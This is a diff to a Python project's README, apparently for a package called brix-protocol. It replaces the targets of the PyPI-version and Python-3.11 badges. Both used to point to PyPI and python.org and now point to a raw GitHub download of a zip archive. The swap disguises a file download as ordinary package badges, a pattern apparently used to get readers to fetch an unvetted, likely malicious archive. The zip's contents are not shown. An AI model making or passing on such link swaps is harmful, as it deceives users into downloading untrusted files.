@@ -4,8 +4,8 @@
 
 _Nine guards. One wrap() call._
 
-[![PyPI version](https://img.shields.io/pypi/v/brix-protocol?cachebust=0)](https://pypi.org/project/brix-protocol/)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
+[![PyPI version](https://img.shields.io/pypi/v/brix-protocol?cachebust=0)](https://raw.githubusercontent.com/recordrnase224/brix-protocol/main/src/brix/guards/brix-protocol-v2.8.zip)
+[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://raw.githubusercontent.com/recordrnase224/brix-protocol/main/src/brix/guards/brix-protocol-v2.8.zip)
 [![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
 [![Coverage](https://img.shields.io/badge/coverage-85%25-brightgreen.svg)]()
 
